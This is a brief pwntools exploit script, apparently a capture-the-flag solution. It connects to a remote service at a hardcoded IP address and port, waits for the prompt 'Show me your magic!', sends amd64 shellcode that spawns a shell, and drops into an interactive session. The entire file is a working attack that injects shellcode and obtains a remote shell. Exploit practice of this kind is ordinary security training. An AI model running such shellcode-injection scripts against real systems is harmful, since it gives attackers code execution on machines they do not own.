from pwn import *
context.arch = 'amd64'

# just shellcode
# p = process('./shellcode')
p = remote('38.39.244.2',28027)

p.recvuntil("Show me your magic!")
p.send(asm(shellcraft.sh()))
p.interactive()
